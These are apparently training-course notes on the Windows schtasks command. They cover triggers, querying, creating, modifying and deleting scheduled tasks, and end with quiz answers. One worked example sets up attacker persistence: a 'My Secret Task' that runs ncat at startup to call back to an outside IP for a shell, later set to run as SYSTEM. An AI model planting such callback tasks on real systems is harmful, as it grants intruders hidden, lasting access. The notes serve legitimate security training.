Scheduled tasks are valuable for both administrators and attackers. They enable routine automation for admins and can serve as persistence mechanisms for attackers. Here’s a breakdown of using `schtasks` to manage scheduled tasks:


#### What Are Scheduled Tasks?
- **Purpose**: Automate routine tasks without manual intervention.
- **Operation**: The Task Scheduler monitors for specific conditions (triggers) and executes tasks when these conditions are met.

**Story Time**: During pentesting engagements, attackers often use scheduled tasks to set up persistence. For example, an attacker might create a task that runs on user logon or system reboot to connect back to a Command and Control (C2) server using PowerShell. This method helps maintain access and potentially elevate privileges without triggering antivirus or data loss prevention systems.

#### Triggers for Scheduled Tasks
Scheduled tasks can be triggered by various conditions, including:
- **System Events**: Specific system events occurring.
- **Time-Based**:
    - Specific time.
    - Daily schedule.
    - Weekly schedule.
    - Monthly schedule.
    - Day-of-week monthly schedule.
- **Idle State**: When the computer enters an idle state.
- **Task Registration**: When the task is registered.
- **System Boot**: When the system boots up.
- **User Logon**: When a user logs on.
- **Terminal Server Session**: When a Terminal Server session changes state.
These triggers offer flexibility for automating tasks based on different conditions.


**Display Scheduled Tasks**:
- Command: `schtasks /query`
- Purpose: Lists all scheduled tasks on the system.
- Example:
```
C:\> schtasks /query
```


**Create a New Task**:
- Command: `schtasks /create`
- Purpose: Create a new scheduled task with specified parameters.
- Syntax:
```
schtasks /create /tn "TaskName" /tr "TaskRunCommand" /sc schedule [options]
```
- Example: Create a task to run a script at user logon:
```
C:\> schtasks /create /tn "MyTask" /tr "powershell.exe -File C:\Path\To\Script.ps1" /sc onlogon
```


**Delete a Task**:
- Command: `schtasks /delete`
- Purpose: Remove a scheduled task.
- Syntax:
```
schtasks /delete /tn "TaskName"
```
- Example:
```
C:\> schtasks /delete /tn "MyTask"
```


**Change a Task**:
- Command: `schtasks /change`
- Purpose: Modify an existing scheduled task.
- Syntax:
```
schtasks /change /tn "TaskName" [options]
```
- Example: Change the task to run daily at a specific time:
```
C:\> schtasks /change /tn "MyTask" /tr "new_command.exe" /sc daily /st 09:00
```


**Run a Task Immediately**:
- Command: `schtasks /run`
- Purpose: Trigger a task to run immediately.
- Syntax:
```
schtasks /run /tn "TaskName"
```
- Example:
```
C:\> schtasks /run /tn "MyTask"
```


**Stop a Task**:
- Command: `schtasks /end`
- Purpose: Stop a running scheduled task.
- Syntax:
```
schtasks /end /tn "TaskName"
```
- Example:
```
C:\> schtasks /end /tn "MyTask"
```
**Note**: The above commands are not exhaustive. For a full list of parameters and options, refer to the `schtasks` help menu using `/?.`

![[Screenshot_20240915_201430.png]]

To view the details of existing scheduled tasks on a host, you can use the `schtasks` command with specific parameters. This helps in examining tasks and their configurations in a detailed manner.

#### Viewing Existing Tasks
To list the scheduled tasks with detailed information, use the following command:
```
SCHTASKS /Query /V /FO list
```

**Example Output:**
```
Folder: \  
HostName:                             DESKTOP-Victim
TaskName:                             \Check Network Access
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive only
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               DESKTOP-Victim\htb-admin
Task To Run:                          C:\Windows\System32\cmd.exe ping 8.8.8.8
Start In:                             N/A
Comment:                              quick ping check to determine connectivity. If it passes, other tasks will kick off. If it fails, they will delay.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          tru7h
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At system start up
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

<SNIP>
```


**Parameters Used:**
- `/Query`: Displays a list of tasks.
- `/V`: Provides detailed information about each task.
- `/FO list`: Formats the output as a list.


**Explanation of Output Fields:**
- **Folder**: The folder in which the task is located.
- **HostName**: Name of the host where the task is scheduled.
- **TaskName**: The name of the scheduled task.
- **Next Run Time**: Time when the task is next scheduled to run.
- **Status**: Current status of the task (e.g., Ready, Running).
- **Logon Mode**: Specifies the logon mode required for the task to run.
- **Last Run Time**: The last time the task was executed.
- **Last Result**: The exit code of the last run.
- **Author**: The user account under which the task was created.
- **Task To Run**: Command or executable that the task will run.
- **Start In**: The directory from which the task starts.
- **Comment**: Additional information or description about the task.
- **Scheduled Task State**: Indicates whether the task is enabled or disabled.
- **Idle Time**: Specifies if the task is triggered by idle time.
- **Power Management**: Defines task behavior in different power modes.
- **Run As User**: The user account under which the task runs.
- **Delete Task If Not Rescheduled**: Indicates if the task should be deleted if it is not rescheduled.
- **Stop Task If Runs X Hours and X Mins**: Specifies the maximum duration for which the task can run.
- **Schedule**: Details about the task's scheduling (not always available in this format).

![[Screenshot_20240915_201708.png]]

#### Creating a New Scheduled Task
Creating a new scheduled task involves specifying several key parameters. The minimal requirements include:
- `/create`: Indicates that you are creating a new task.
- `/sc`: Sets the schedule for the task.
- `/tn`: Defines the name of the task.
- `/tr`: Specifies the action to be taken by the task.
**Example Command:**
```
schtasks /create /sc ONSTART /tn "My Secret Task" /tr "C:\Users\Victim\AppData\Local\ncat.exe 172.16.1.100 8100"
```
**Explanation:**
- **`/sc ONSTART`**: The task is scheduled to run when the system starts.
- **`/tn "My Secret Task"`**: The name of the task.
- **`/tr "C:\Users\Victim\AppData\Local\ncat.exe 172.16.1.100 8100"`**: Specifies the executable to run and the arguments to pass (in this case, Ncat connecting to a remote host).
**Outcome:**
```
SUCCESS: The scheduled task "My Secret Task" has successfully been created.
```
This command creates a scheduled task that runs at system startup. It launches Ncat (located in the user's AppData directory) and connects to a specified IP address and port, which could be used to get a shell back to a command and control framework if the task is executed successfully.


#### Modifying an Existing Scheduled Task
Modifying an existing scheduled task typically involves changing its triggers, actions, or other settings. The `schtasks` command can be used to accomplish this by adding or altering parameters.
**Example Command for Modifying a Task:**
```
schtasks /change /tn "My Secret Task" /tr "C:\NewPath\NewExecutable.exe"
```
**Explanation:**
- **`/change`**: Indicates that you are modifying an existing task.
- **`/tn "My Secret Task"`**: Specifies the name of the task to be modified.
- **`/tr "C:\NewPath\NewExecutable.exe"`**: Changes the action to be taken by the task.

**Common Parameters for Modification:**
- **/tn**: Specifies the task name.
- **/tr**: Defines the new action or command to be executed.
- **/sc**: Changes the schedule (e.g., daily, weekly

![[Screenshot_20240915_201813.png]]

#### Modifying a Scheduled Task to Use Specific Credentials
If you need to modify a scheduled task to run with specific credentials (e.g., using a local admin password hash), you can use the `/change` parameter with `schtasks` to set the user account and password.
**Example Command:**
```
schtasks /change /tn "My Secret Task" /ru administrator /rp "P@ssw0rd"
```
**Explanation:**
- **`/change`**: Indicates you are modifying an existing task.
- **`/tn "My Secret Task"`**: Specifies the task name to modify.
- **`/ru administrator`**: Sets the user account under which the task will run.
- **`/rp "P@ssw0rd"`**: Provides the password for the specified user account.
**Outcome:**
```
SUCCESS: The parameters of scheduled task "My Secret Task" have been changed.
```


#### Verifying Task Changes
To ensure that your changes have been applied correctly, query the specific task using the `/tn` parameter and review the task details.
**Example Command:**
```
schtasks /query /tn "My Secret Task" /V /fo list
```
**Explanation:**
- **`/query`**: Queries the details of an existing task.
- **`/tn "My Secret Task"`**: Specifies the name of the task to query.
- **`/V`**: Provides verbose output, including detailed information.
- **`/fo list`**: Formats the output as a list for readability.
**Example Output:**
```
Folder: \
HostName:                             DESKTOP-Victim
TaskName:                             \My Secret Task
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               DESKTOP-victim\htb-admin
Task To Run:                          C:\Users\Victim\AppData\Local\ncat.exe 172.16.1.100 8100
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At system start up
```
In the output, verify that:
- The `Run As User` is set to `SYSTEM` or the desired user account.
- The `Task To Run` is correct.
- The task is scheduled correctly.


#### Running the Task Immediately
To test if the task runs as expected, use the `/run` parameter to execute it immediately.
**Example Command:**
```
schtasks /run /tn "My Secret Task"
```
**Explanation:**
- **`/run`**: Executes the specified task immediately.
- **`/tn "My Secret Task"`**: Specifies the name of the task to run.


#### Deleting a Scheduled Task
To delete a scheduled task, use the `/delete` parameter.
**Example Command:**
```
schtasks /delete /tn "My Secret Task"
```
**Explanation:**
- **`/delete`**: Indicates that you want to remove the task.
- **`/tn "My Secret Task"`**: Specifies the name of the task to delete

![[Screenshot_20240915_201948.png]]


**Command to Delete a Scheduled Task:**
```
schtasks /delete /tn "My Secret Task"
```
- **Without `/F` Option**: If you do not include the `/F` option, you will be prompted to confirm the deletion. This requires user input to proceed.
**Example Prompt:**
```
WARNING: Are you sure you want to delete this task (Yes/No)?
```
**With `/F` Option**: Adding the `/F` (Force) option will delete the task without prompting for confirmation.
**Example Command with `/F`:**
```
schtasks /delete /tn "My Secret Task" /F
```
**Outcome:**
```
SUCCESS: The scheduled task "My Secret Task" has been deleted.
```


## Questions
- True or False: A scheduled task can be set to run when a user logs onto a host?
	- True
- Access the target host and take some time to practice working with Scheduled Tasks. Type COMPLETE as the answer when you are ready to move on.
	- Complete